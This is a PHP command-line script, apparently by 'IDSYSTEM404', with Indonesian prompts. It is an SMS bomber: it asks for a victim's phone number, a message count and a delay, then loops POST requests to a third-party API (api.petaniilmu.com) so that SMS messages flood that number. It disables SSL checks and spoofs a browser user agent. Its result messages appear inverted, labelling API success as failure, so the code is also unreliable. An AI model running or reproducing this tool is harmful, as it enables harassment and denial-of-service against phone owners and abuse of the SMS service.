<?php
error_reporting(0);
function threebomb($no, $jum, $wait = 0){
    $x = 1;
echo "\n\e[1;35m===========================[ BOM SMS THREE ]==========================\e[0m\r\n";
echo "Masukkan Nomor         : ";
$no       = rtrim( fgets( STDIN));

echo "Masukkan Jumlah SMS    : ";
$jum       = rtrim( fgets( STDIN));

echo "Masukkan Delay         : ";
$wait       = rtrim( fgets( STDIN));

echo "Apakah mau [BOM SMS] sekarang? ";
rtrim( fgets( STDIN));


    $result = "";
    while($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bomsmsthree.php?bomsms=".$no);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		$json = json_decode($server_output);
		if($json->code == "200" && $json->status == "success"){
			$result .= "GAGAL\n";
		} else {
            $result .= $x.". SUKSES SMS KE => ".$no." [IDSYSTEM404 - SMS THREE BOMBER]\n";
		}
		if($wait != 0){
		    sleep($wait);
		}
        $x++;
    }
	return($result);
}
$execute = threebomb('', '');
print $execute;
?>